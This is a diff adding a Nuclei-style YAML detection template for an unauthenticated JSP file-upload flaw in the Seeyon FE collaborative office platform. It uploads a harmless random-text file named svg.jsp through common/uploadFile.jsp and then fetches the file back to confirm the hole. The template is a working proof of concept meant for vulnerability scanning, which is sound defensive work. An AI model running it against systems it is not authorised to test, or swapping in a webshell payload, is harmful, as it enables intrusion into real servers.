@@ -1,0 +1,59 @@
+id: poc-yaml-seeyon-hulian-fe-common-uploadfilejsp-fileuploadW
+info:
+  name: 致远互联FE协作办公平台 commonuploadFile.jsp 文件上传
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  random: "{{rand_text_alphanumeric(32)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: GET
+    path:
+      - "{{BaseURL}}/common/uploadFile.jsp?action=save&savePath=/images/upload/&fileName=test123.jpg&title1=%C9%CF%B4%AB%CE%C4%BC%FE&title2=%D1%A1%D4%F1%CE%C4%BC%FE&allowsize=null&extName=.jsp"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundarylBU670lIdrGgVSWG"
+      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
+    body: |
+      ------WebKitFormBoundarylBU670lIdrGgVSWG
+      Content-Disposition: form-data; name="accessory"; filename="svg.jsp"
+      Content-Type: application/octet-stream
+
+      {{random}}
+      ------WebKitFormBoundarylBU670lIdrGgVSWG--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "fileName=/images/upload/"
+    extractors:
+      - type: regex
+        name: uploaded_filename
+        internal: true
+        part: body
+        group: 1
+        regex:
+          - "fileName=/images/upload/(?P<t1>.*?)&title1="
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/images/upload/{{uploaded_filename}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{random}}"
